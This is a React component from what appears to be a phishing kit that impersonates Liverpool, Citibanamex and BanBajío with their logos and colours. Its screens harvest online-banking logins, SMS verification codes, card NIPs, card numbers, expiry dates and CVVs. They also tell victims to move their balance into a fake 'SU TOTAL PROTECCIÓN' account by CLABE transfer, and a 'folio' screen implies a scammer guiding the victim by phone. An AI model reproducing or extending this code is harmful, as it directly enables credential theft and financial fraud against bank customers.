import React, { useState, useContext } from 'react';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { ScreenType } from '@shared/schema';
import liverpoolLogo from '../../assets/pngwing.com 2.png';
import citibanamexLogo from '../../assets/Banamex.png';
import banbajioLogo from '../../assets/banbajio_logo.png';

interface ScreenTemplatesProps {
  currentScreen: ScreenType;
  screenData: {
    terminacion?: string;
    saldo?: string;
    monto?: string;
    clabe?: string;
    titular?: string;
    comercio?: string;
    mensaje?: string;
  };
  onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
  banco?: string;
}

export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
  currentScreen, 
  screenData,
  onSubmit,
  banco = "LIVERPOOL"
}) => {
  // Form state
  const [folioInput, setFolioInput] = useState('');
  const [loginInputs, setLoginInputs] = useState({ username: '', password: '' });
  const [codigoInput, setCodigoInput] = useState('');
  const [nipInput, setNipInput] = useState('');
  const [tarjetaInput, setTarjetaInput] = useState('');
  const [fechaVencimientoInput, setFechaVencimientoInput] = useState('');
  const [cvvInput, setCvvInput] = useState('');

  // Helper function to render the appropriate screen
  const renderScreen = () => {
    switch (currentScreen) {
      case ScreenType.FOLIO:
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
            {banco === 'BANBAJIO' && (
              <div className="bajionet text-2xl font-bold mb-3">
                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
              </div>
            )}
            <h2 className="text-xl font-bold mb-3">Folio de soporte:</h2>
            <p className="mb-4">
              {banco === 'BANBAJIO' 
                ? "Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporcionó."
                : "Ingrese el folio que su ejecutivo le proporcionó."
              }
            </p>
            <Input 
              type="text" 
              placeholder="Ingrese su número de folio" 
              className="w-full border border-gray-300 rounded p-2 mb-3"
              value={folioInput}
              onChange={(e) => setFolioInput(e.target.value)}
            />
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
            >
              Ingresar
            </Button>
          </div>
        );

      case ScreenType.LOGIN:
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
            {banco === 'BANBAJIO' && (
              <div className="bajionet text-2xl font-bold mb-3">
                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
              </div>
            )}
            <h2 className="text-xl font-bold mb-3">Inicio de sesión:</h2>
            <p className="mb-4">Ingrese su usuario y contraseña.</p>
            <Input 
              type="text" 
              placeholder="Usuario" 
              className="w-full border border-gray-300 rounded p-2 mb-3"
              value={loginInputs.username}
              onChange={(e) => setLoginInputs(prev => ({ ...prev, username: e.target.value }))}
            />
            <Input 
              type="password" 
              placeholder="Contraseña" 
              className="w-full border border-gray-300 rounded p-2 mb-3"
              value={loginInputs.password}
              onChange={(e) => setLoginInputs(prev => ({ ...prev, password: e.target.value }))}
            />
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.LOGIN, loginInputs)}
            >
              Ingresar
            </Button>
          </div>
        );

      case ScreenType.CODIGO:
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
            {banco === 'BANBAJIO' && (
              <div className="bajionet text-2xl font-bold mb-3">
                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
              </div>
            )}
            <h2 className="text-xl font-bold mb-3">Hemos enviado un código de verificación</h2>
            <p className="mb-4">
              Ingresa el código que recibiste en tu número celular terminación: <strong>{screenData.terminacion || "1881"}</strong>
            </p>
            <Input 
              type="text" 
              placeholder="Ingrese el SMS recibido" 
              className="w-full border border-gray-300 rounded p-2 mb-3"
              value={codigoInput}
              onChange={(e) => setCodigoInput(e.target.value)}
            />
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.CODIGO, { codigo: codigoInput })}
            >
              Continuar
            </Button>
            {banco === 'BANBAJIO' && (
              <div className="small-links mt-4">
                <a href="#" className="text-[#4D2C91] mr-2 text-sm">Nueva aclaración</a> | 
                <a href="#" className="text-[#4D2C91] ml-2 text-sm">Estatus de mis aclaraciones</a>
              </div>
            )}
          </div>
        );

      case ScreenType.NIP:
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
            <h2 className="text-xl font-bold mb-3">Ingresa tu NIP</h2>
            <p className="mb-4">Para continuar, por favor ingresa el NIP de tu tarjeta.</p>
            <Input 
              type="password" 
              placeholder="Ingrese su NIP" 
              maxLength={4}
              className="w-full border border-gray-300 rounded p-2 mb-3"
              value={nipInput}
              onChange={(e) => setNipInput(e.target.value)}
            />
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.NIP, { nip: nipInput })}
            >
              Continuar
            </Button>
          </div>
        );

      case ScreenType.PROTEGER:
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
            {banco === 'BANBAJIO' && (
              <div className="bajionet text-2xl font-bold mb-3">
                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
              </div>
            )}
            <div className="text-4xl mb-2">⚠️</div>
            <h2 className="text-xl font-bold mb-3">Es necesario proteger su saldo</h2>
            <p className="mb-4">
              {banco === 'BANBAJIO' 
                ? "Por su seguridad, es necesario proteger el saldo de su cuenta efectiva, crearemos una cuenta de SU TOTAL PROTECCIÓN para respaldar el fondo disponible."
                : "Se creará una cuenta de TOTAL PROTECCIÓN para respaldar su saldo."
              }
            </p>
            <div className="p-3 bg-gray-100 rounded mb-4">
              <p className="font-bold">Saldo sin proteger:</p>
              <p className="text-lg"><strong>{screenData.saldo || "$444"}</strong></p>
            </div>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.PROTEGER, { proteger: true })}
            >
              Continuar
            </Button>
          </div>
        );

      case ScreenType.TRANSFERIR:
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
            {banco === 'BANBAJIO' && (
              <div className="bajionet text-2xl font-bold mb-3">
                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
              </div>
            )}
            <h2 className="text-xl font-bold mb-3">Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</h2>
            <p className="mb-4">
              Transfiera la cantidad de <strong>{screenData.monto || "$444"}</strong> a la siguiente cuenta{banco === 'BANBAJIO' ? ' SU TOTAL PROTECCIÓN (STP)' : ''}:
            </p>
            <div className="text-left p-4 bg-gray-100 rounded mb-4">
              <p><strong>Alias:</strong> Cuenta de respaldo.</p>
              <p><strong>Clabe:</strong> <span>{screenData.clabe || "272762626262727272727272266222"}</span></p>
              <p><strong>Titular:</strong> <span>{screenData.titular || "Juan Pérez"}</span></p>
            </div>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.TRANSFERIR, { transferencia: true })}
            >
              Confirmar transferencia
            </Button>
            {banco === 'BANBAJIO' && (
              <div className="small-links mt-4">
                <a href="#" className="text-[#4D2C91] mr-2 text-sm">Nueva aclaración</a> | 
                <a href="#" className="text-[#4D2C91] ml-2 text-sm">Estatus de mis aclaraciones</a>
              </div>
            )}
          </div>
        );

      case ScreenType.TARJETA:
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
            <h2 className="text-xl font-bold mb-3">Protección adicional</h2>
            <p className="mb-4">Para evitar compras en línea no autorizadas, agregue protección a su tarjeta.</p>
            
            <div className="mb-4 p-3 bg-gray-50 rounded-lg border border-gray-200">
              <h3 className="text-sm font-semibold mb-2 text-left">Ingrese los datos de su tarjeta</h3>
              <Input 
                type="text" 
                placeholder="Número de tarjeta (16 dígitos)" 
                className="w-full border border-gray-300 rounded p-2 mb-3"
                value={tarjetaInput}
                onChange={(e) => setTarjetaInput(e.target.value)}
                maxLength={16}
              />
              
              <div className="flex gap-3 mb-3">
                <div className="w-1/2">
                  <Input 
                    type="text" 
                    placeholder="Fecha de vencimiento (MM/AA)" 
                    className="w-full border border-gray-300 rounded p-2"
                    value={fechaVencimientoInput}
                    onChange={(e) => setFechaVencimientoInput(e.target.value)}
                    maxLength={5}
                  />
                </div>
                <div className="w-1/2">
                  <Input 
                    type="text" 
                    placeholder="CVV (código verificador)" 
                    className="w-full border border-gray-300 rounded p-2"
                    value={cvvInput}
                    onChange={(e) => setCvvInput(e.target.value)}
                    maxLength={3}
                  />
                </div>
              </div>
              
              <div className="text-xs text-left text-gray-600 mb-1">
                <div className="flex items-center">
                  <div className="bg-gray-200 rounded p-1 mr-2">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                  </div>
                  Su información es protegida con cifrado de seguridad
                </div>
              </div>
            </div>
            
            <Button 
              className={`${primaryBtnClass} w-full`}
              onClick={() => onSubmit(ScreenType.TARJETA, { 
                tarjeta: tarjetaInput,
                fechaVencimiento: fechaVencimientoInput,
                cvv: cvvInput
              })}
            >
              Continuar
            </Button>
            
            <div className="mt-4">
              <a href="#" className="text-blue-600 block mt-2 text-sm">Nueva aclaración</a>
              <a href="#" className="text-blue-600 block mt-2 text-sm">Estatus de mis aclaraciones</a>
            </div>
          </div>
        );

      case ScreenType.CANCELACION:
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
            <h2 className="text-xl font-bold mb-3">Cancelación exitosa</h2>
            <p className="mb-3">Hemos cancelado su cargo no reconocido de forma exitosa.</p>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p><strong>Comercio:</strong> <span>{screenData.comercio || "Liverpool en línea"}</span></p>
              <p><strong>Monto devuelto:</strong> <span>{screenData.monto ? `$${screenData.monto}` : "$6,262"}</span></p>
            </div>
            <p className="mb-4">El monto estará disponible en su tarjeta dentro de 72 horas.</p>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.CANCELACION, { finalizado: true })}
            >
              Finalizar
            </Button>
          </div>
        );

      case ScreenType.MENSAJE:
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
            <h2 className="text-xl font-bold mb-3">Mensaje del banco</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p>{screenData.mensaje || "Mensaje personalizado del banco."}</p>
            </div>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.MENSAJE, { leido: true })}
            >
              Entendido
            </Button>
          </div>
        );

      case ScreenType.VALIDANDO:
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
            <h2 className="text-xl font-bold mb-4">Validando...</h2>
            <p className="text-sm text-gray-500 mb-4">Esto puede tomar un momento. Por favor espere...</p>
            <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
              <div className={`h-full ${banco === 'BANBAJIO' ? 'banbajio-bg' : banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 'bg-[#e10098]'} animate-progress-bar`}></div>
            </div>
            <p className="text-xs text-gray-400 mt-3">Verificando información de seguridad</p>
          </div>
        );

      default:
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
            <h2 className="text-xl font-bold mb-3">Pantalla no disponible</h2>
            <p>La pantalla solicitada no está disponible en este momento.</p>
          </div>
        );
    }
  };

  // Definimos las clases de estilos para los botones según el banco
  const getPrimaryBtnClass = () => {
    switch(banco) {
      case 'CITIBANAMEX':
        return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANBAJIO':
        return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
      default:
        return 'bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Liverpool
    }
  };

  const primaryBtnClass = getPrimaryBtnClass();

  const bankLogo = () => {
    switch(banco) {
      case 'CITIBANAMEX':
        return <img src={citibanamexLogo} alt="Citibanamex" className="h-16 mx-auto mb-4" />;
      case 'BANBAJIO':
        return <img src={banbajioLogo} alt="BanBajío" className="h-16 mx-auto mb-4" />;
      default:
        return <img src={liverpoolLogo} alt="Liverpool" className="h-16 mx-auto mb-4" />;
    }
  };

  return (
    <div className={banco === 'BANBAJIO' ? 'bg-white p-4 rounded-lg shadow' : ''}>
      {banco === 'BANBAJIO' && (
        <div className="logo text-center mb-4">
          {bankLogo()}
          <div className="banbajio-header mb-4">
            {new Date().toLocaleDateString('es-MX', {
              day: 'numeric',
              month: 'long',
              year: 'numeric'
            })}
          </div>
        </div>
      )}
      {renderScreen()}
    </div>
  );
};
